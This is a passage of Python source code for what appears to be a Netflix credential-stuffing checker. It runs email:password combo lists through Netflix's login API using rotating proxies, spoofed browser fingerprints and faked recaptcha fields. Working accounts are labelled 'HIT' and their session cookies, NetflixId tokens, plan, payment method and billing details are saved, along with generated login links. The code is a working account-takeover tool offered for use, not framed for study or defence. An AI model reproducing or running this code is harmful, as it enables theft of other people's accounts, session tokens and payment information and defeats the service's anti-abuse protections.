            if not _has_pw(tids1):
                pw_su = cmds1[-1] if cmds1 else ''
                r1b = _gql_br(sess, ns1, pw_su, [], av, country, lowcode, ch, step='collectOtp')
                ns1b = _nstate(r1b); cmds1b = _subcmds(r1b); tids1b = _tids(r1b)
                if ns1b and _has_pw(tids1b):
                    pw_state, pw_cmds = ns1b, cmds1b
                elif ns1b:
                    if bool(tids1b & _OTP_TIDS) or any(k in ' '.join(_texts(r1b)).lower() for k in _OTP_KW):
                        return 'BAD', '', '', None
                    pw_state, pw_cmds = ns1b, cmds1b
                else:
                    if is_otp: return 'BAD', '', '', None
                    if any(kw in ' '.join(_texts(r1b)).lower() for kw in _TRANSIENT):
                        if attempt < MAX_RETRY_BR - 1: time.sleep(random.uniform(3, 7)); continue
                        return 'RETRY', '', '', None
            pw_su2 = pw_cmds[1] if len(pw_cmds) > 1 else (pw_cmds[0] if pw_cmds else '')
            r2 = _gql_br(sess, pw_state, pw_su2, [
                {"name": "password",              "value": {"stringValue": password}},
                {"name": "userLoginId",           "value": {"stringValue": email}},
                {"name": "countryCode",           "value": {"stringValue": cc}},
                {"name": "countryIsoCode",        "value": {"stringValue": country}},
                {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(200, 600)}},
                {"name": "recaptchaError",        "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
            ], av, country, lowcode, ch, step='passwordLogin')
            low2 = r2.lower(); tids2 = _tids(r2); txts2 = ' '.join(_texts(r2)).lower()
            if (tids2 & _OTP_TIDS) or any(k in txts2 for k in _OTP_KW):
                if not (_has_pw(tids2) and _has_submit(tids2)): return 'BAD', '', '', None
            if any(sig in r2 or sig in low2 for sig in _LOGIN_OK):
                cookies = _extract_cookies_br(sess)
                nf_id   = _get_netflix_id(cookies)
                nftoken = _generate_nftoken(nf_id, proxy_url) if nf_id else None
                login_pc, login_phone, login_tv = _make_login_links(nftoken)
                links = {'pc': login_pc, 'phone': login_phone, 'tv': login_tv} if nftoken else None
                info = None
                for _ in range(3):
                    info = _verify_account_br(sess, ua, country)
                    if info is not None: break
                    time.sleep(random.uniform(1, 2.5))
                if info and info.get('_active'):
                    return 'HIT', _fmt_capture_br(info, country, cookies, login_pc), cookies, links
                elif info is not None:
                    cc_v = info.get('Country', country); fl = _flag(cc_v)
                    parts = ['Status = Former Member']
                    if info.get('Country'): parts.append(f"Country = {info['Country']} {fl}")
                    if info.get('Since'):   parts.append(f"Since = {info['Since']}")
                    if info.get('Plan'):    parts.append(f"Plan = {info['Plan']}")
                    if cookies:             parts.append(f"Cookies = {cookies}")
                    parts.append(f"by = {TAG}")
                    return 'FREE', ' | '.join(parts), cookies, None
                else:
                    lk = f" | LoginLink = {login_pc}" if login_pc else ""
                    ck = f" | Cookies = {cookies}" if cookies else ""
                    return 'HIT', f'Login OK{lk}{ck} | by = {TAG}', cookies, links
            if any(kw in txts2 for kw in _TRANSIENT):
                if attempt < MAX_RETRY_BR - 1: time.sleep(random.uniform(3, 7)); continue
                return 'RETRY', '', '', None
            if (tids2 & _FREE_TIDS) or any(kw in txts2 for kw in _FREE_KW):
                ck = f" | Cookies = {_extract_cookies_br(sess)}"
                return 'FREE', f'Former Member{ck} | by = {TAG}', _extract_cookies_br(sess), None
            if tids2 & _NEVER_TIDS: return 'BAD', '', '', None
            if any(kw in low2 or kw in txts2 for kw in _BAD_KW): return 'BAD', '', '', None
            if _has_pw(tids2) and _has_submit(tids2):
                if not any(kw in txts2 for kw in _TRANSIENT): return 'BAD', '', '', None
            if attempt < MAX_RETRY_BR - 1: time.sleep(random.uniform(2, 5) * (attempt + 1)); continue
            return 'RETRY', '', '', None
        except Exception as exc:
            err = str(exc).lower()
            if any(x in err for x in _NET_ERR):
                if pool: proxy_url = pool.next(); ch = _pick_chrome(); ua, pf = ch['ua'], ch['pf']
                time.sleep(random.uniform(1, 3)); continue
            if attempt < MAX_RETRY_BR - 1: time.sleep(random.uniform(2, 5) * (attempt + 1)); continue
            if net_only: return 'RETRY', '', '', None
            return 'BAD', '', '', None
    return 'RETRY', '', '', None

def _detect_country_br(proxy_url=None):
    try:
        s = creq.Session(impersonate="chrome136") if CURL_OK else creq.Session()
        if proxy_url: s.proxies = {'http': proxy_url, 'https': proxy_url}
        r = s.get('https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location',
                  headers={'accept': 'application/json', 'origin': 'https://www.netflix.com'}, timeout=10)
        raw = r.text
        m = re.search(r'\{[^}]+\}', raw)
        data = json.loads(m.group()) if m else r.json()
        c = data.get('country', 'US')
    except: c = 'US'
    return c, c.lower(), PHONE_CODES.get(c, '1')

def _worker_br(q, pool, stats, country, lowcode, cc, out, done_ev):
    while not done_ev.is_set():
        try:
            item = q.get(timeout=1)
        except queue.Empty:
            continue
        try:
            if isinstance(item, tuple) and len(item) == 3:
                email, pw, retries = item
            else:
                q.task_done(); continue
            email = email.strip(); pw = pw.strip()
            if not email or not pw: q.task_done(); continue
            proxy_url = pool.next() if pool else None
            status, detail, cookies, links = _check_br(email, pw, proxy_url, country, lowcode, cc, pool=pool)
            if status == 'RETRY':
                if retries < MAX_OUTER_BR:
                    stats.inc_retry(); q.put((email, pw, retries + 1)); q.task_done(); continue
                status = 'BAD'
            stats.add(status.lower())
            ep = f"{email}:{pw}"
            if status == 'HIT':
                line = f"{ep} | {detail}"
                _log('HIT', line); _save(out['hit'], line)
                if cookies: _save(out['cookies'], f"{ep} | {cookies}")
            elif status == 'FREE':
                line = f"{ep} | {detail}"
                _log('FREE', line); _save(out['free'], line)
                if cookies: _save(out['cookies'], f"{ep} | {cookies}")
            else:
                _save(out['bad'], ep)
            _bar(stats)
        except Exception:
            try:
                stats.add('bad')
                if 'email' in dir() and 'pw' in dir(): _save(out['bad'], f"{email}:{pw}")
            except: pass
        finally:
            try: q.task_done()
            except ValueError: pass

def _run_batch_br(cc, combos, proxy_components, threads_n, out):
    fl       = _flag(cc) if cc != 'XX' else ''
    cc_upper = cc if cc != 'XX' else 'US'
    if proxy_components:
        cc_proxies = [_country_proxy_url(u, p, h, pt, pr, cc) for u, p, h, pt, pr in proxy_components]
    else:
        cc_proxies = []
    if cc != 'XX':
        country = cc_upper; lowcode = country.lower(); phone_cc = PHONE_CODES.get(country, '1')
    else:
        country, lowcode, phone_cc = ('US', 'us', '1')
        if cc_proxies:
            country, lowcode, phone_cc = _detect_country_br(cc_proxies[0])
    pool   = ProxyPool(cc_proxies) if cc_proxies else None
    actual = min(threads_n, len(combos))
    q = queue.Queue()
    for email, pw in combos: q.put((email, pw, 0))
    stats   = Stats(len(combos))
    done_ev = threading.Event()
    workers = []
    for _ in range(actual):
        t = threading.Thread(target=_worker_br,
                             args=(q, pool, stats, country, lowcode, phone_cc, out, done_ev),
                             daemon=True)
        t.start(); workers.append(t)
    interrupted = False
    try:
        q.join()
    except KeyboardInterrupt:
        print(f"\n  {Y}Stopped.{RS}"); done_ev.set()
        for t in workers: t.join(timeout=2)
        interrupted = True
    if not interrupted:
        done_ev.set()
        for t in workers: t.join(timeout=2)
    return stats, interrupted

async def _gql_ios(session, ss, su, fields, av, country, lowcode, ua):
    lang = LANG_MAP.get(country.upper(), 'en')
    loc  = f'{lang}-{country.upper()}'
    h = {
        'x-netflix.request.id':              ''.join(random.choices(string.hexdigits[:16], k=32)),
        'x-netflix.context.operation-name':   'CLCSScreenUpdate',
        'x-netflix.request.originating.url':  f'https://www.netflix.com/{lowcode}/login',
        'x-netflix.context.app-version':      av,
        'x-netflix.request.clcs.bucket':      'high',
        'x-netflix.context.locales':          loc.lower(),
        'x-netflix.context.ui-flavor':        'akira',
        'x-netflix.request.toplevel.uuid':    str(uuid.uuid4()),
        'x-netflix.request.attempt':          '1',
        'x-netflix.request.client.context':   '{"appstate":"foreground"}',
        'x-netflix.context.hawkins-Version':  '5.16.0',
        'x-netflix.context.form-Factor':      'phone',
        'x-netflix.context.is-Inapp-Browser': 'false',
        'accept':           '*/*',
        'content-type':     'application/json',
        'accept-language':  f'{loc},{lang};q=0.9,en;q=0.8',
        'user-agent':       ua,
        'origin':           'https://www.netflix.com',
        'referer':          'https://www.netflix.com/',
        'sec-fetch-site':   'same-site',
        'sec-fetch-mode':   'cors',
        'sec-fetch-dest':   'empty',
        'accept-encoding':  'gzip, deflate, br',
    }
    body = {
        "operationName": "CLCSScreenUpdate",
        "variables": {
            "format": "HTML", "imageFormat": "PNG", "locale": loc,
            "serverState": ss, "serverScreenUpdate": su or "",
            "inputFields": fields,
        },
        "extensions": {"persistedQuery": {"id": PID_IOS, "version": PQ_VER}}
    }
    resp = await session.post(GQL_IOS, headers=h, json=body, timeout=10)
    if resp.status_code == 429: raise ConnectionError("rate-limited")
    return resp.text

async def _extract_cookies_ios(session):
    try:
        parts = [f'{c.name}={c.value}' for c in session.cookies.jar]
        return '; '.join(parts)
    except:
        try: return '; '.join(f'{k}={v}' for k, v in session.cookies.items())
        except: return ''

async def _verify_account_ios(session, country):
    info = {}
    try:
        r = await session.get('https://www.netflix.com/youraccount', headers={
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'upgrade-insecure-requests': '1',
            'user-agent': _IOS_DESK_UA,
        }, timeout=8)
        html = r.text
    except: return None
    if not html or len(html) < 500: return None
    for key, left, right in [
        ('Plan',       '"localizedPlanName":{"fieldType":"String","value":"', '"'),
        ('Country',    '"currentCountry":"',                                  '"'),
        ('MaxStreams', '"maxStreams":{"fieldType":"Numeric","value":',         '},'),
        ('Quality',    '"videoQuality":{"fieldType":"String","value":"',      '"'),
        ('Since',      '"memberSince":"',                                     '",'),
        ('NextBill',   '"nextBillingDate":{"fieldType":"String","value":"',   '"'),
        ('Payment',    '"paymentMethod":{"fieldType":"String","value":"',     '"'),
        ('ExtraMember', '"showExtraMemberSection":{"fieldType":"Boolean","value":', '},'),
    ]:
        v = _between(html, left, right)
        if v: info[key] = _unes(v.strip())
    if info.get('ExtraMember') == 'true': info['ExtraMember'] = 'YES'
    elif info.get('ExtraMember') == 'false': del info['ExtraMember']
    try:
        nid = snid = None
        for c in session.cookies.jar:
            if c.name == 'NetflixId': nid = c.value
            elif c.name == 'SecureNetflixId': snid = c.value
        if nid:  info['NetflixId'] = nid
        if snid: info['SecureNetflixId'] = snid
    except:
        try:
            nid  = session.cookies.get('NetflixId')
            snid = session.cookies.get('SecureNetflixId')
            if nid:  info['NetflixId'] = nid
            if snid: info['SecureNetflixId'] = snid
        except: pass
    m = re.search(r'"numProfiles"\s*:\s*(\d+)', html)
    if m: info['Profiles'] = m.group(1)
    if '"CURRENT_MEMBER":true' in html or '"currentMemberStatus":"CURRENT_MEMBER"' in html:
        info['_active'] = True
    elif ('"FORMER_MEMBER":true' in html or '"NEVER_MEMBER":true' in html
          or '"currentMemberStatus":"FORMER_MEMBER"' in html):
        info['_active'] = False
    elif '"isMember":true' in html:  info['_active'] = True
    elif '"isMember":false' in html: info['_active'] = False
    else: info['_active'] = bool(info.get('Plan')) and bool(info.get('NextBill'))
    return info

def _fmt_capture_ios(info, country, cookies=''):
    parts = []
    cc = info.get('Country', country); fl = _flag(cc)
    for k in ['Plan','Country','MaxStreams','Quality','NextBill','Payment','Since','Profiles','ExtraMember']:
        v = info.get(k)
        if not v: continue
        parts.append(f"Country = {v} {fl}" if k == 'Country' else f"{k} = {v}")
    nid  = info.get('NetflixId', '')
    snid = info.get('SecureNetflixId', '')
    if nid:     parts.append(f"NetflixId = {nid}")
    if snid:    parts.append(f"SecureNetflixId = {snid}")
    if cookies: parts.append(f"Cookies = {cookies}")
    parts.append(f"by = {TAG}")
    return ' | '.join(parts)

def _fmt_free_ios(info, country, cookies=''):
    cc_v = info.get('Country', country); fl = _flag(cc_v)
    parts = ['Status = Former Member']
    if info.get('Country'): parts.append(f"Country = {info['Country']} {fl}")
    if info.get('Since'):   parts.append(f"Since = {info['Since']}")
    if info.get('Plan'):    parts.append(f"Plan = {info['Plan']}")
    if cookies:             parts.append(f"Cookies = {cookies}")
    parts.append(f"by = {TAG}")
    return ' | '.join(parts)

async def _check_ios(email, password, proxy_url, country, lowcode, cc):
    prof = random.choice(_IOS_TLS)
    ua   = prof['ua']
    lang = LANG_MAP.get(country.upper(), 'en')
    for attempt in range(MAX_RETRY_IOS):
        try:
            async with AsyncSession(impersonate=prof['imp'], proxy=proxy_url, allow_redirects=True) as s:
                loc_hdr = f'{lang}-{country}'
                page = await s.get(f'https://www.netflix.com/{lowcode}/login', headers={
                    'accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'accept-language': f'{loc_hdr},{lang};q=0.9,en;q=0.8',
                    'accept-encoding': 'gzip, deflate, br',
                    'upgrade-insecure-requests': '1',
                    'sec-fetch-site':  'none', 'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest':  'document', 'user-agent': ua,
                }, timeout=12)
                ss, su, av = _tokens(page.text, str(page.url))
                if not ss:
                    if attempt < MAX_RETRY_IOS - 1: await asyncio.sleep(random.uniform(0.15, 0.35)); continue
                    return 'RETRY', '', ''
                await asyncio.sleep(random.uniform(0.05, 0.15))
                r1 = await _gql_ios(s, ss, su or '', [
                    {"name": "userLoginId",           "value": {"stringValue": email}},
                    {"name": "countryCode",           "value": {"stringValue": cc}},
                    {"name": "countryIsoCode",        "value": {"stringValue": country}},
                    {"name": "recaptchaError",        "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
                    {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(1200, 3000)}},
                ], av, country, lowcode, ua)
                ns1 = _nstate(r1); cmds1 = _subcmds(r1); tids1 = _tids(r1)
                txts1 = ' '.join(_texts(r1)).lower()
                if not ns1:
                    if attempt < MAX_RETRY_IOS - 1: await asyncio.sleep(random.uniform(0.15, 0.35)); continue
                    return 'RETRY', '', ''
                if tids1 & _NEVER_TIDS: return 'BAD', '', ''
                if (tids1 & _FREE_TIDS) or any(k in txts1 for k in _FREE_KW):
                    return 'FREE', f'Former Member | by = {TAG}', ''
                is_otp  = bool(tids1 & _OTP_TIDS) or any(k in txts1 for k in _OTP_KW)
                has_pw_fb = ('usePasswordInsteadHelpMenuItem' in tids1 or
                             'help-menu-item-0' in tids1 or 'help-menu-item-1' in tids1)
                if is_otp and not has_pw_fb: return 'BAD', '', ''
                pw_state, pw_cmds = ns1, cmds1
                if not _has_pw(tids1):
                    pw_su = cmds1[-1] if cmds1 else ''
                    r1b   = await _gql_ios(s, ns1, pw_su, [], av, country, lowcode, ua)
                    ns1b  = _nstate(r1b); cmds1b = _subcmds(r1b); tids1b = _tids(r1b)
                    if ns1b and _has_pw(tids1b):
                        pw_state, pw_cmds = ns1b, cmds1b
                    elif ns1b:
                        if bool(tids1b & _OTP_TIDS) or any(k in ' '.join(_texts(r1b)).lower() for k in _OTP_KW):
                            return 'BAD', '', ''
                        pw_state, pw_cmds = ns1b, cmds1b
                    else:
                        if is_otp: return 'BAD', '', ''
                        if any(kw in ' '.join(_texts(r1b)).lower() for kw in _TRANSIENT):
                            if attempt < MAX_RETRY_IOS - 1: await asyncio.sleep(random.uniform(0.15, 0.35)); continue
                            return 'RETRY', '', ''
                        if attempt < MAX_RETRY_IOS - 1: await asyncio.sleep(random.uniform(0.15, 0.3)); continue
                        return 'RETRY', '', ''
                await asyncio.sleep(random.uniform(0.05, 0.15))
                pw_su2 = pw_cmds[1] if len(pw_cmds) > 1 else (pw_cmds[0] if pw_cmds else '')
                r2 = await _gql_ios(s, pw_state, pw_su2, [
                    {"name": "password",              "value": {"stringValue": password}},
                    {"name": "userLoginId",           "value": {"stringValue": email}},
                    {"name": "countryCode",           "value": {"stringValue": cc}},
                    {"name": "countryIsoCode",        "value": {"stringValue": country}},
               
